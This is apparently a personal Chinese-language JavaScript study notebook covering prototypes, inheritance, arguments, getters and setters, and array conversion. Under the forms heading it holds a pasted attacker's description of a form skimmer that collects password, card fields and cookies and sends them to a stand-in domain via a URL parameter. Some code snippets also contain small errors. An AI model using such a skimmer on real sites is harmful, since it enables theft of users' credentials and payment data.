目录

	模拟new
















原型和原型链 
作用域和作用域

执行上下文 由 变量对象 作用域链 this 组成

函数闭包

继承

ajax json 

es6  promise  

mvc 
webpack vue


构造函数
 不写new 普通函数， 
 写了new，它就变成了一个构造函数，它绑定的this指向新创建的对象


原型  向上推 就是原型链

继承 向上推 就是继承链

定义新的构造函数，并在内部用call()调用希望“继承”的构造函数，并绑定this；



函数参数   数组  类数组转换成数组  创建对象  原型属性   bind call apply



 










 
 












dom   
	node
	nodelist htmlcollection
	document
	element
	属性的操作
	text 
	css


事件  
	EventTarget
	事件模型
	Event对象

	冒泡 传播  委托 消息队列 
	
	事件循环 Event Loop
		执行上下文(Execution context)   
		函数调用栈(call stack)
		队列数据结构(queue)
		Promise 
	


浏览器 

异步

	定时器
	
	promise
	

json
ajax




表单
The malicious code itself is very simple, it does its best work when it runs on a page that meets the following criteria:

The page has a <form>
an element matches input[type="password"] or name="cardnumber" or name="cvc" etc.
The page contains words like “credit card”, “checkout”, “login”, “password” etc.
Then, when there’s a blur event on a password/credit card field, or a form submit event is heard, my code:

Takes data from all form fields (document.forms.forEach(…)) on the page
Grabs document.cookie
It turns all that into a random looking string const payload = btoa(JSON.stringify(sensitiveUserData))
Then sends it off to `https://legit-analytics.com?q=${payload}` (not the real domain, of course)
In short, if it looks like data that might be even remotely valuable to me, I send it off to my server.







逻辑运算符
	&& 和
	当两个都是true 才返回true
	左侧假 全都假 不考虑右边
	
	if(a==b)stop();//只有在a==b的时候才调用stop()
	(a==b)＆＆stop();//同上
	
	
	||或 
	
	p=p||{}   p是对象吗 是就保留 不是就创建
	
	！非
	!(p&&q)===!p||!q
	!(p||q)===!p&&!q

变量作用域
然而在函数内声明的变量只在函数体内有定义。它们是局部变量，作用域是局部性的。函数参数也是局部变量，它们只在函数体内有定义。
在函数体内，局部变量的优先级高于同名的全局变量。如果在函数内声明的一个局部变量或者函数参数中带有的变量和全局变量重名，那么全局变量就被局部变量所遮盖






函数的参数  

	传参少了  形参会默认设置为undefined
	传参多了  会忽略
	
	
	函数声明和函数表达式 的点 在函数提升

	arguments是指向实参对象的引用  arguments[2]获取实参
	arguments并不是真正的数组，它是一个实参对象。每个实参对象都包含以数字为索引的一组元素以及length属性，但它毕竟不是真正的数组。可以这样理解，它是一个对象，只是碰巧具有以数字为索引的属性
	
	
	不定参数函数 实参个数不能为0
			function max(/*...*/){
			
			var max=Number.NEGATIVE_INFINITY;//遍历实参，查找并记住最大值
			for(var i=0;i<arguments.length;i++)
			if(arguments[i]>max)max=arguments[i];//返回最大值
			return max;
			}   max(1,2,3)
	
	
	修改参数
		function f(x ){
			console.log(x);
			arguments[0]=null;
			console.log(x);
		}
	
	检查参数输入
	
		function check(args){
		var actual=args.length;//实参的真实个数
		var expected=args.callee.length;//期望的实参个数
		if(actual!==expected)//如果不同则抛出异常
		throw Error("要求输入"+expected+"个，"+"实际输入"+actual+"个");
		}
		
		function f(x,y,z){
			check(arguments);//检查实参个数和期望的实参个数是否一致
		return x+y+z;//再执行函数的后续逻辑
		}
		





map 
var m = new Map();
m.set("age",67); //添加新的key-value
m.has("age");    //是否存在key
m.get("age");    //67
m.delete("age") 

集合 set
var s = new Set([1, 2, 3, 3, '3']);
s; // Set {1, 2, 3, "3"}


getter 
语法 
	{get prop() { ... } }
	
	{get [expression]() { ... } }
	get语法将对象属性绑定到查询该属性时将被调用的函数。
    有时需要允许访问返回动态计算值的属性，或者你可能需要反映内部变量的状态

    var test = {
    get o(){
        console.log('监听到正在获取属性o的值');
        return this._o;
    },
    set o(v){
        console.log('监听到正在设置属性o的值为：' + v);
        this._o = v;
        return this._o;
    }
    }

	test.o = 14; // 监听到正在设置属性o的值为：14
	console.log(test.o); // 监听到正在获取属性o的值

  

setter 可以用delete操作来移除。	

	var language = {
	  set current(name) {
	    this.log.push(name);
	  },
	  log: []
	}
	
	language.current = 'EN';
	language.current = 'FA';
	
	console.log(language.log);
	// expected output: Array ["EN", "FA"]
	
	

var test = {};

Object.defineProperties(test, {
  o: {
     get() {},
     set(v) {}
  },
  p: {
    get() {},
    set(v) {}
  }
});


数组特性 
	当有新的元素加入时 自动刷新length属性
	设置length为一个较小的值将截断数组
	从Array.prototype中继承一些方法 
	其类属性为 Array 

	给对象添加一些属性 使其变成类数组对象 
		var a ={}; 
		//添加一些属性 称为 类数组
		var i= 0;
		while(i<10){
			a[i]=i*i;
			i++;
		}
		a.length=i; //现在 当真正的数组去遍历他
		
		var total = 0;
		for(var j = 0; j<a.length; j++){
			total=total+a[j]
		}  //285
	
	
	判断对象是不是类数组
	function isArrayLike(o) {
	    if (o &&                                // o is not null, undefined, etc.
	        typeof o === 'object' &&            // o is an object
	        isFinite(o.length) &&               // o.length is a finite number
	        o.length >= 0 &&                    // o.length is non-negative
	        o.length===Math.floor(o.length) &&  // o.length is an integer
	        o.length < 4294967296)              // o.length < 2^32
	        return true;                        // Then o is array-like
	    else
	        return false;                       // Otherwise it is not
	}
	--------------------- 
  
类数组转换成数组
	Array.prototype.slice.call() 
	这种方法是借用了数组原型中的slice方法，返回一个数组。slice方法的内部实现：

	Array.prototype.slice=function(start,end){
		var result = new Array();
		start = start||0;
		end = end||this.length; //使用call后 this指向类数组
		for(var i=start; i<end; i++){
			result.push(this[i]);
		}
		return result;
	}

	通用的转换函数
		var toArray = function(s){
			try{
				return Array.prototype.slice.call(s);
			}catch(e){
				var arr=[];
				for(var i=0,len = s.length; i<len; i++){
					arr[i] = s[i]; //复制 拉链效果
				}

			}
		}

		各种大小写 长名字 很难写的  原来真的是为了自己好  好区分



		Array.from(arrayLike, 回调) 把类数组对象和可遍历（iterable）对象 转换成数组 
			参数：arrayLike
				想要转换成数组的伪数组对象或可迭代对象。
		
		console.log(Array.from('foo'));
		// ["f", "o", "o"]
		
		console.log(Array.from([1, 2, 3], x => x + x));
		//   [2, 4, 6]
		
	 
			
			var arrayLike = {
			    '0':'a',
			    '1':'b',
			    '2':'c',
			    length:3
			};
			var arr = Array.from(arrayLike);//['a','b','c']
			//把NodeList对象转换为数组，然后使用数组的forEach方法
			var ps = document.querySelectorAll('p');
			Array.from(ps).forEach(p){
			    console.log(p);
			});                             
			//转换arguments对象为数组
			function foo(){
			    var args = Array.from(arguments);
			    //...
			}
			//只要是部署了Iterator接口的数据结构，Array.from都能将其转换为数组
			Array.from('hello');            //['h','e','l','l','o']
	 

		扩展运算符（…） //看不懂
		同样是ES6中新增的内容，扩展运算符（…）也可以将某些数据结构转为数组
		
			//arguments对象的转换
			function foo(){
			    var args = [...arguments];
			}
			//NodeList对象的转换
			[...document.querySelectorAll('p')]
 


每个字符串加个空格返回
	function spacify(str) {
	  return str.split('').join(' ');
	}
	
	加到string原型里
	String.prototype.spacify=function(){
		return this.split("").join(" ");
	}


参数 arguments   
	定义一个 log 方法，让它可以代理 console.log 方法，常见的解决方法是：
	
	 
		function log(msg)　{
		  console.log(msg);
		}
		log(1);    //1
		log(1,2);    //1
		
		function log(){
		  console.log.apply(console, arguments);
		};
		log(1);    //1
		log(1,2);    //1 2
	
	给每一个 log 消息添加一个"(app)"的前辍  
	arugments是一个伪数组，然后会将他转化成为标准数组。通常方法是使用Array.prototype.slice
	
		function log(){
			
		  var args = Array.prototype.slice.call(arguments);
		  args.unshift('(app)');
		 
		  console.log.apply(console, args);
		};



变量对象是执行上下文的属性
	activeExecutionContext = {
	  VO: {
	    // 上下文中的数据 (变量声明（var）, 函数声明（FD), 函数形参（function arguments）)
	  }
};




	

上下文

 	var User = {
 	  count: 1,
 	
 	  getCount: function() {
 	    return this.count;  
 	  }
 	};
 	 console.log(User.getCount()); //1
 	
 	    var func = User.getCount;  //全局环境下执行的 找不到getCount
 	    console.log(func()); //undefined  
 	
 	怎么样保证User总是能访问到func的上下文正常  返回：1
 	var func = User.getCount.bind(User);
 	    console.log(func());
 	

通过做一个‘弹出窗口’的库

	在遮罩中最好使用position中的fixed代替absolute属性，这样即使在滚动的时侯，也能始终让遮罩始盖住整个窗口。当侯选人忽略时我会提示他们这一点，并让他们解释fixed和absolute定位的区别。
	
	    .overlay {
	      position: fixed;
	      left: 0;
	      right: 0;
	      bottom: 0;
	      top: 0;
	      background: rgba(0,0,0,.8);
	    }
	他们如何让里面的内容居中也是需要考察的一点。一些侯选人会选择CSS和绝对定位，如果内容有固定的宽、高这是可行的。否则就要使用JavaScript.
	
	    .overlay article {
	      position: absolute;
	      left: 50%;
	      top: 50%;
	      margin: -200px 0 0 -200px;
	      width: 400px;
	      height: 400px;
	    }
	我也会让侯选人确保当遮罩被点击时要自动关闭，这会很好地考查事件冒泡机制的机会。通常侯选人会在overlay上面直接绑定一个点击关闭的方法。
	
	    $('.overlay').click(closeOverlay);
	这是个方法，不过直到你认识到点击窗口里面的东西也会关闭overlay的时侯——这明显是个BUG。解决方法是检查事件的触发对象和绑定对象是否一致，从而确定事件不是从子元素里面冒上来的，就像这样：
	
	    $('.overlay').click(function(e){
	      if (e.target == e.currentTarget)
	        closeOverlay();
	    });
	






 




创建对象 

	构造函数创建对象
	
		function Her(){}
		var he = new Her();
	
	对象直接量
		var o = {
			name:"name",
			say:function f1(){}
		}
	

	对象属性
		对象概念的引入 是为了将变量按逻辑进行分类
	                   
	                    
		属性名 加引号 的情况
	                            
		1. 时保留字
		2. 有空格 特殊符号
		3. 以数字开头
	                       	
		增删改查
	                      	
	 	访问属性  book.author  book[author]
	                              	
	对象方法 
	
		调用方法 say.hello()  
	
	全局对象
		事实上 程序所在的宿主环境会为其提供一个全局对象 所谓全局变量不过是全局对象的属性罢了
	
	
		function f(name){this.name=name;} 
		
		var h=new f('me');
		
		h.name==window.name  //true
		
		
		function f(){this.name=1;} 
		
		var h=new f();
		
		h.name==window.name //false
		
		
		var o = {}; 
		o.constructor
		ƒ Object() { [native code] }
		typeof o.constructor //"function" 
		
		
		
		

		
	
	Object 是所有对象的父级对象
	
		Object.prototype.toString()
			var o = new Object();
			o.toString(); // returns [object Object]
			 
			var array = ["ABC", true, 12, -5];
			console.log(array.toString());    
		 
		 
		
		Object.prototype.valueOf()
			如果对象没有原始值，则valueOf将返回对象本身
		
			array 返回数组本身
				var arr = [1,2,3];
				console.log(arr.valueOf()=== arr) //true
			
			Function：返回函数本身
				function foo(){}
				console.log( foo.valueOf() === foo );   // true
			
			date 返回现在时间以前所有的毫秒数
				var date = new Date(2018,10,22)
				console.log(date.valueOf());
			
			number 返回数字值
				var num = 15.26262626;  //15.26262626
				console.log(num.valueOf())
			
			布尔   :返回对象本身
			Object：返回对象本身
			String：返回字符串值
			

			// new一个字符串对象
			var str2 = new String("http://www.xyz.com");
			// 两者的值相等，但不全等，因为类型不同，前者为string类型，后者为object类型
			console.log( str2.valueOf() == str2 );    //true 
			console.log( str2.valueOf() === str2 );   // false	

			valueOf和toString http://www.cnblogs.com/zichi/p/4106711.html
			var bb = {
			   i: 10,
			   valueOf: function() {
			     console.log('valueOf');
			     return this.i;
			   }
			 }
			 
			 alert(bb);// [object Object]
			 alert(+bb); // 10 valueOf
			 alert(''+bb); // 10 valueOf
			 alert(String(bb)); // [object Object]
			 alert(Number(bb)); // 10 valueOf
			 alert(bb == '10'); // true valueOf

	Array
	Function
		尽量避免使用 new Function
	
	
	
		返回参数列表
			function f(){return arguments}
			f(1,2,3)//[1,2,3]
		
		callee 返回当前被调用的对象
			function f() {return arguments.callee}
			f() // f() 返回自身
		
		匿名函数的递归调用
		(
		function(count){
			if(count<5){
				alert(count);
				arguments.callee(++count)
			}
		}
		)(1)
		
	number
		parseInt("123")
		parseInt("FF",10)
		
		parseFloat("1.23")
		
		isNaN(NaN) //true
		isFinite(无穷大)  //用来检测一个数是不是有限数
	
	String
		s.charAt(0) 根据找字符
		s.indexOf("o") 第一次出现的位置 
		s.concat("ed") 追加字符串
		


原型属性


	每个函数中都有一个prototype属性 用于存放原型对象
	
	 对象自身的属性高于原型属性
	
	
	
	
	例子
	function gad(name,color){
		this.name = name;
		this.color = color;
		this.some = function(){return 1;}
	
	}
	gad.prototype.price  = 100;
	gad.prototype.rating = 3;
	var xin = new gad("can","black");
	遍历键值
		for(var p in xin){
			console.log(p+"="+xin[p])
		}
		
	遍历自身属性
		for(var p in xin){
			if(xin.hasOwnProperty(p)){
				console.log(p+"="+xin[p]);  //name color some 
			} 
		}
	
	遍历可枚举
		for(var p in xin){
			if(xin.constructor.prototype.propertyIsEnumerable(p)){
				console.log(p+"="+xin[p]); //price  rating
			}
		}
	
	
	
	自制 判断数组中是否存在某个特定的值
	
		array.prototype.inarray = function(value){
			for(var i=0,len=this.length; i<len; i++){
				if(this[i]===value){
					return true;
				}
			}
			return false;
		}
	 
		var a=[1,2,3]
		a.inarray(1)
	
	反转字符串
		String.prototype.reverse = function(){
			return Array.prototype.reverse.apply(this.split('')).join('');
		}
	
	













 



















精髓 

	继承 三种实现方案 
		基于类
		基于原型
		基于元类
	
	原型继承的基本性质
		对象并没有原型 构造器有原型  对象构造自某个原型 并不持有
	
		构造器有一个原型对象a 由该构造器创建的实例 都继承了a的所有属性
	
	    
	
	从 Object.prototype 上复制出一个对象映射
		var o1 =new Object();
		var o2 = {}
	
	对象成员的存取规则
		js采用写时复制  只在第一次写的时候用一些代码分配内存 需要维护成员表
		读取属性 向上遍历整个原型链
	
	
	伪类 
		javascript不直接让对象从其他对象继承 反而插了一个多余的简介层 通过构造函数产生对象
	
	
	
	
	
	结构
		控制结构
			顺序
			分支
			循环
		数据结构
			基本数据结构
			复合数据结构
	
		数据的表现形式是编程的根本
	
		程序 = 算法+结构
		
		程序 = 数据+算法+方法
	
		
		
		(实现(步骤(方法(工具))))	
		
	
	 
	
	
	原型
		通过关键字new和构造函数调用创建的对象的原型 就是构造函数的prototype属性的值
		
		Date()创建的date对象的属性 同时继承自 Date.prototype 和 Object.prototype  这就是原型链 
	
	继承 
	理解继承 要了解属性访问的细节
	
	例子
		var o={}            //o从Object.prototype继承对象的方法
		o.x=1;              //给o定义一个属性x
		var p=inherit(o);   //p继承o和Object.prototype
		p.y=2;              //给p定义一个属性y
		var q=inherit(p);   //q继承p、o和Object.prototype
		q.z=3;              //给q定义一个属性z
		var s=q.toString(); //toString继承自Object.prototype
		q.x+q.y             //=＞3:x和y分别继承自o和p
	
	只要在查询属性时才会体会到继承的存在 而设置属性和继承无关
	
	
	设置属性  如果o继承自属性x  而这个属性是一个具有setter方法的accessor属性
	那么这时将调用这个setter方法 而不是给o创建一个属性x
	
	setter方法是由对象o调用的 不是原型调用的  因此setter方法定义任意属性 只针对o本身 并不会修改原型链
	
	属性访问

	对象存在  属性不存在 undefined
	对象不存在 访问属性  报错
	
	遍历属性 
	复制属性
	function extend(o,p){
		for(i in p){ //遍历p中的所有属性
			o[i]=p[i]; //将属性添加到o
		}
		return o;
	}
	
	getter 只读属性    setter 只写属性 返回值是 undefined
	
	由getter和setter定义的属性称做“存取器属性”  这个方法的返回值就是属性的值
 



不知道js



	词法作用域 
	
	是把变量写在哪里决定的
	
	词法作用域的函数中遇到既不是形参也不是函数内部定义的局部变量的变量时，去函数定义时的环境中查询。
	
	动态域的函数中遇到既不是形参也不是函数内部定义的局部变量的变量时，到函数调用时的环境中查。
	
 
	
	
	
	
	
	
复制
Object.assign(target, ...sources)
	target
		目标对象。
	sources
		源对象。
	
	例子
		复制一个对象
		var obj = { a: 1 };
		var copy = Object.assign({}, obj);
		console.log(copy); // { a: 1 }
	合并对象
		var o1 = { a: 1 };
		var o2 = { b: 2 };
		var o3 = { c: 3 };
		
		var obj = Object.assign(o1, o2, o3);
		console.log(obj); // { a: 1, b: 2, c: 3 }
		console.log(o1);  // { a: 1, b: 2, c: 3 }, 注意目标对象自身也会改变。
	
		
	
访问描述符 get set
	
	描述符类型
	　　对象属性描述符的类型分为两种：数据属性和访问器属性
	
	数据属性
		writable（可写）、enumerable（可枚举）和 configurable（可配置） Value(属性值)
	访问器属性
	    enumerable（可枚举）  configurable（可配置） getter setter 
	描述符方法
	
	    Object.getOwnPropertyDescriptor()  
	    Object.defineProperty()  
	    Object.defineProperties()       <--锚点--->js.js
	    Object.create()  
	
	var myObject = {
	 a: 2
	};
	myObject.a; // 2
	
	获取属性值的 [[Get]] 操作，
	在语言规范中 myObject.a在 myObject上实际是实现了[[get]] 操作 （有点像函数调用[[get]]() ）
	[[get]]操作首先在对象中查找是否有名字相同的属性 有就返回这个属性值 没有就遍历原型链
	
	属性复制触发[[put]]
	
	如果已经存在这个属性，[[Put]] 算法大致会检查下面这些内容。
	1. 属性是否是访问描述符（参见 3.3.9 节）？如果是并且存在 setter 就调用 setter。
	2. 属性的数据描述符中 writable 是否是 false ？如果是，在非严格模式下静默失败，在
	严格模式下抛出 TypeError 异常。
	3. 如果都不是，将该值设置为属性的值。
	 
	
	
	
	
类理论
    类 / 继承描述了一种代码的组织结构形式——一种在软件中对真实世界中问题领域的建模
	方法
		类 设计模式
		javascript中的类
	类的机制
		建造
		构造函数
			类实例是由一个特殊的类方法构造的，这个方法名通常和类名相同，被称为构造函数。这
	个方法的任务就是初始化实例需要的所有信息（状态）
			类构造函数属于类，而且通常和类同名。此外，构造函数大多需要用 new 来调，这样语言
	引擎才知道你想要构造一个新的类实例。
	
	类的继承
	
		多态
		超类 表示当前类的父类和祖先类
	
		其他语言    构造函数是属于类的
		Javascript “类”是属于构造函数的  父类和子类的关系只存在于两者构造函数对应的prototype对象中 不存在直接联系 无法相对引用 es6中用super来解决这个问题
	
		我们可以在 dian_huo() 中看到多态非常有趣的一点。在 pilot() 中通过相对多态引用了
		（继承来的）che 中的 jia_shi()。但是那个 jia_shi() 方法直接通过名字（而不是相对引
		用）引用了 dian_huo() 方法。
		那么语言引擎会使用哪个 dian_huo() 呢，che 的还是 kuai_ting 的？实际上它会使用
		kuai_ting 的 dian_huo()。如果你直接实例化了 che 类然后调用它的 jia_shi()，那语言
		引擎就会使用 che 中的 dian_huo() 方法
	
		*- 子类 不是它们创建的实例对象！ 
	
		从概念上来说，子类 Bar 应当可以通过相对多态引用（或者说 super）来访问父类 Foo 中
		的行为。需要注意，子类得到的仅仅是继承自父类行为的一份副本。子类对继承到的一个
		方法进行“重写”，不会影响父类中的方法，这两个方法互不影响，因此才能使用相对多
		态引用访问父类中的方法（如果重写会影响父类的方法，那重写之后父类中的原始方法就
		不存在了，自然也无法引用）。
		
		多态并不表示子类和父类有关联，子类得到的只是父类的一份副本。
		
		*-类的继承其实就是复制()
	
	
	
	
	
		多重继承
		钻石问题  三个同名方法 选哪个？
		 在钻石问题中，子类 D 继承自两个父类（B和 C），
		 这两个父类都继承自 A。
		 如果 A 中有 drive() 方法并且 B 和 C 都重写了这个方法（多态），
		 那当 D 引用 drive() 时应当选择哪个版本呢（B:drive() 还是 C:drive()）？
	
	
混入
	
	在继承或者实例化时，JavaScript 的对象机制并不会自动执行复制行为。简单来说，
	JavaScript 中只有对象，并不存在可以被实例化的“类”。一个对象并不会被复制到其他对
	象，它们会被关联起来（参见第 5 章）。
	
	由于在其他语言中类表现出来的都是复制行为，因此 JavaScript 开发者也想出了一个方法来
	模拟类的复制行为，这个方法就是混入。
	
	
		显示混入
	
			function mixin( sourceObj, targetObj ) { 
			 for (var key in sourceObj) {
			 // 只会在不存在的情况下复制  
			 //是在目标对象初始化之后才进行复制
			 if (!(key in targetObj)) { 
			 targetObj[key] = sourceObj[key];
			 } 
			 }
			 return targetObj; 
			}
	
	JavaScript 中的函数无法（用标准、可靠的方法）真正地复制，所以你只能复制对共享
	函数对象的引用（函数就是对象；参见第 3 章）。如果你修改了共享的函数对象（比如
	ignition()），比如添加了一个属性，那 Vehicle 和 Car 都会受到影响
	
	
	如果你必须使用
	一个复杂的库或者函数来实现这些细节，那就标志着你的方法是有问题的或者是不必要
	的。
	
	
	
	寄生继承
		显式混入模式的一种变体被称为“寄生继承”，它既是显式的又是隐式的
		
	
	子类继承父类 下载副本重写父类  子类构建实例
	
	
	
		隐式混入  利用了 this 的重新绑定功能  Something.cool.call( this ); 
	
		尽量避免使用 显示混入和隐式混入
	
	
		看完一章 小结 复述
	
		传统的类被实例化时，它的行为会被复制到实例中。类被继承时，行为也会被复制到子类
		中。
		多态（在继承链的不同层次名称相同但是功能不同的函数）看起来似乎是从子类引用父
		类，但是本质上引用的其实是复制的结果。
		JavaScript 并不会（像类那样）自动创建对象的副本
		
		
		混入模式（无论显式还是隐式）可以用来模拟类的复制行为，难以维护
		
		总地来说，在 JavaScript 中模拟类是得不偿失的
	
	
原型 屏蔽
	
	[[Prototype]] 链的顶端设置为 Object.prototype 对象
	所以它包含 JavaScript 中许多通用的功能
	
	　属性设置 
	
		如果 foo 不是直接存在于 myObject 中，[[Prototype]] 链就会被遍历，类似 [[Get]] 操作。
	如果原型链上找不到 foo，foo 就会被直接添加到 myObject 上。
	
	如果属性名 foo 既出现在 myObject 中也出现在 myObject 的 [[Prototype]] 链上层，那
	么就会发生屏蔽。myObject 中包含的 foo 属性会屏蔽原型链上层的所有 foo 属性，因为
	myObject.foo 总是会选择原型链中最底层的 foo 属性。
	
	屏蔽
	
	属性可写 会屏蔽   不可写不会屏蔽   是setter() 会调用它 
	1. 如果在 [[Prototype]] 链上层存在名为 foo 的普通数据访问属性（参见第 3 章）并且没
	有被标记为只读（writable:false），那就会直接在 myObject 中添加一个名为 foo 的新
	属性，它是屏蔽属性。
	2. 如果在 [[Prototype]] 链上层存在 foo，但是它被标记为只读（writable:false），那么
	无法修改已有属性或者在 myObject 上创建屏蔽属性。如果运行在严格模式下，代码会
	抛出一个错误。否则，这条赋值语句会被忽略。总之，不会发生屏蔽。
	3. 如果在 [[Prototype]] 链上层存在 foo 并且它是一个 setter（参见第 3 章），那就一定会
	调用这个 setter。foo 不会被添加到（或者说屏蔽于）myObject，也不会重新定义 foo 这
	个 setter。
	
	你希望在第二种和第三种情况下也被屏蔽 使用 Object.defineProperty(..)
	
	JavaScript 中只有对象 没有类
	
	
	
	
	
	
	类函数
		为什么一个对象需要关联到另一个对象
		
		var a = new Foo();
		 Foo.prototype 这个对象是在调用 new Foo()时创建的，最后会被
		（有点武断地）关联到这个“Foo 点 prototype”对象上
		
		new Foo() 会生成一个新对象（我们称之为 a），这个新对象的内部链接 [[Prototype]] 关联
		的是 Foo.prototype 对象。
		
		
		var a = new Foo();
		new Foo() 这个函数调用实际上并没有直接创建关联  间接实现 一个关联到其他对象的新对象
		
		有没有更直接的方法  Object.create(..)，
		
		
		继承意味着复制操作，JavaScript（默认）并不会复制对象属性。相反，JavaScript 会在两
		个对象之间创建一个关联，这样一个对象就可以通过委托访问另一个对象的属性和函数。
		委托
		
		
		
		var a = new Foo(); 
		实际上 a 本身并没有 .constructor 属性。而且，虽然 a.constructor 确实指
		向 Foo 函数，但是这个属性并不是表示 a 由 Foo“构造
		
		实际上，new 会劫持所有普通函数并用构造对象的形式来调用它
		
		NothingSpecial() 只是一个普通的函数，但是使用 new 调用时，它就会构造一个对象并赋值
		给 a，这看起来像是 new 的一个副作用（无论如何都会构造一个对象）。这个调用是一个构
		造函数调用，但是 NothingSpecial 本身并不是一个构造函数
		
		
		var a = new Foo(); 
		a.constructor 不直接指向  Foo()
		
		实际上 a.constructor 引用 同样被委托给了 Foo.Prototype 
		而Foo.prototype.constructor默认指向 Foo
		
		举例来说，Foo.prototype 的 .constructor 属性只是 Foo 函数在声明时的默认属性。如果
		你创建了一个新对象并替换了函数默认的 .prototype 对象引用，那么新对象并不会自动获
		得 .constructor 属性。
		
		
		
		
		function Foo() { /* .. */ }
		Foo.prototype = { /* .. */ }; // 创建一个新原型对象
		var a1 = new Foo();
		a1.constructor === Foo; // false! 
		a1.constructor === Object; // true!
		解析： 
		Foo.prototype = {  };  //设置为空
		a1 并没有 .constructor 属性，所以它会委托 [[Prototype]] 链上的 Foo.
		prototype。但是这个对象也没有 .constructor 属性（不过默认的 Foo.prototype 对象有这
		个属性！），所以它会继续委托，这次会委托给委托链顶端的 Object.prototype。这个对象
		有 .constructor 属性，指向内置的 Object(..) 函数
		
		 记住这一点“constructor 并不表示被构造
		
		手动 让 Foo.prototype.constructor 指向Foo
		function Foo() { /* .. */ }
		Foo.prototype = { /* .. */ }; // 创建一个新原型对象
		// 需要在 Foo.prototype 上“修复”丢失的 .constructor 属性
		// 新对象属性起到 Foo.prototype 的作用
		// 关于 defineProperty(..)，参见第 3 章
		Object.defineProperty( Foo.prototype, "constructor" , {
		 enumerable: false,
		 writable: true,
		 configurable: true,
		 value: Foo // 让 .constructor 指向 Foo
		} );	
	
	
原型继承 
	
	正确
		Bar.prototype = Object.create( Foo.prototype )
	
	

	Bar.prototype = new Foo();
		Bar.prototype = Foo.prototype 并不会创建一个关联到 Bar.prototype 的新对象，它只
		是让 Bar.prototype 直接引用 Foo.prototype 对象。因此当你执行类似 Bar.prototype.
		myLabel = ... 的赋值语句时会直接修改 Foo.prototype 对象本身。显然这不是你想要的结
		果，否则你根本不需要 Bar 对象，直接使用 Foo 就可以了，这样代码也会更简单一些。
	
	Bar.prototype = new Foo() 
		的确会创建一个关联到 Bar.prototype 的新对象。但是它使用
		了 Foo(..) 的“构造函数调用”，如果函数 Foo 有一些副作用（比如写日志、修改状态、注
		册到其他对象、给 this 添加数据属性，等等）的话，就会影响到 Bar() 的“后代”，后果
		不堪设想。
		因此，要创建一个合适的关联对象，我们必须使用 Object.create(..) 而不是使用具有副
		作用的 Foo(..)。这样做唯一的缺点就是需要创建一个新对象然后把旧对象抛弃掉，不能
		直接修改已有的默认对象
	
	
	
	
	
	
			function Animal(name){      
			    this.name = name;      
			    this.showName = function(){      
			        alert(this.name);      
			    }      
			}      
			    
			function Cat(name){    
			    Animal.call(this, name);    
			}      
			    
			var cat = new Cat("Black Cat");     
			cat.showName();  
			
			
			仍然注意我选中的部分，thisArg(你的例子中就是Animal.call(this, name)里的this)，fun(你的例子中就是Animal.call(this, name)里的Animal)。
			
			由此我们对Animal.call(this, name)这句话，可以知道两点：
			
			她会执行Animal方法，并传入name作为参数
			
			Animal方法里写的this会被call(this里的this(实际是Cat实例对象，上面刚讲的)替换掉
			
			那你再想想，Animal方法里写的this.name = name;和this.showName = function(){ alert(this.name); }是什么意思？其实就是cat.name = name;和cat.showName = function(){ alert(cat.name); }
			
			现在再看到cat.showName();居然能弹出来Black Cat，还会吃惊么？
	
	
	
反射
	
	如何找到一个实例的继承祖先    
	
	Foo.prototype.isPrototypeOf( a ); // true
	在 a 的整条 [[Prototype]] 链中是否出现过 Foo.prototype ？
	
	b 是否出现在 c 的 [[Prototype]] 链中？
	b.isPrototypeOf( c );
	
	.__proto__ 看起来很像一个属性，但是实际上它更像一个 getter/setter
	
	
	.__proto__ 的实现 
	Object.defineProperty( Object.prototype, "__proto__", { 
	 get: function() {
	 return Object.getPrototypeOf( this ); 
	 },
	 set: function(o) {
	 // ES6 中的 setPrototypeOf(..)
	 Object.setPrototypeOf( this, o );
	 return o;
	 } 
	} );
	
	













类和原型 
	类的所有实例对象都从同一个原型对象上继承属性  因此，原型对象是类的核心

	原型对象作为函数的一个属性存储

构造函数

	构造函数是用来初始化新创建的对象的
	通过同一个构造函数创建的所有对象都继承自一个相同的对象，因此它们都是同一个类的成员

	原型对象是类的唯一标识：当且仅当两个对象继承自同一个原型对象时，它们才是属于同一个类的实例

	构造函数 不能作为类的标识
	
	两个构造函数的prototype属性可能指向同一个原型对象。那么这两个构造函数创建的实例是属于同一个类的。

 
 

 




类的扩充
	我们可以通过给原型对象添加新方法来扩充JavaScript类

	给String.prototype 添加方法 去除空格
	String.prototype.trim=String.prototype.trim||function(){
		if(!this)return this; //空字符串不处理
		return this.replace(/^\s+|\s+$/g,""); 
		}
	去除字符串内所有的空格：str = str.replace(/\s*/g,"");

　　去除字符串内两头的空格：str = str.replace(/^\s*|\s*$/g,"");

　　去除字符串内左侧的空格：str = str.replace(/^\s*/,"");

　　去除字符串内右侧的空格：str = str.replace(/(\s*$)/g,"");

类和类型

	检测类型
	方法1
		function type(boj){
		
		       return Object.prototype.toString.call(boj).slice(8,-1);}  //如果boj是数字，得出的结果是[object Number]
		
		type(1)//"Number"
		
		type("abc")//"String"
	方法2
		var a;
		console.log(typeof(a));

	方法3
		console.log(a instanceof Object);
	方法4
		返回对象构造函数的名字  [].constructor //Array 

类的继承  就是复制 就是下载

	function a() {
	    this.aprop = true;
	}
	
	a.prototype.getAvalue = function() {
	    return this.aprop;
	}
	
	function b() {
	    this.bprop = false;
	}
	
	b.prototype = new a();
	
	b.prototype.getBvalue = function() {
	    return this.bprop;
	}


	改进版
		function inherit(a,b){
		    var prototype=Object(a.prototype);//关键点    
		    prototype.constructor=b;//关键点
		    b.prototype=prototype;//
		}
		
		function a(){
		    this.aprop=[1,2,3];
		}
		
		a.prototype.getAvalue=function(){
		    return this.aprop;
		}
		
		function b(){
		    a.call(this);
		}
		
		 b.prototype=inherit(a,b);
		
		b.prototype.getBvalue=function(){
		    return this.bprop;
		}

定义类
https://www.cnblogs.com/jameslif/p/3678001.html

定义类有三个基本步骤：

1，定义构造函数，构造函数内部定义实例属性。

2，在prototype上定义实例方法

3，在构造函数上定义类属性和类方法，



function Shape()
{
var x = 0 ;  //私有属性
this.y = 1 ; //公有属性
this.draw = function ()
{
alert(x)
};
}  
var aShape = new Shape();
aShape.draw();

aShape.z=3; //静态方法 全局的








Number.isFinite() 检测有限值
	isFinite(Infinity);  // false
	isFinite(0);         // true
	isFinite("0xff");    // true
	

function isArrayLike(o) {
    if(o &&                                    // o不是null、undefined等
       typeof o === 'object' &&                // o是对象
       isFinite(o.length) &&                   // o.length是有限数值
       o.length >= 0 &&                        // o.length为非负值
       o.length === Math.floor(o.length) &&    // o.length是整数
       o.length < 4294967296)                  // o.length < 2^32
       return true
    else
       return false
}


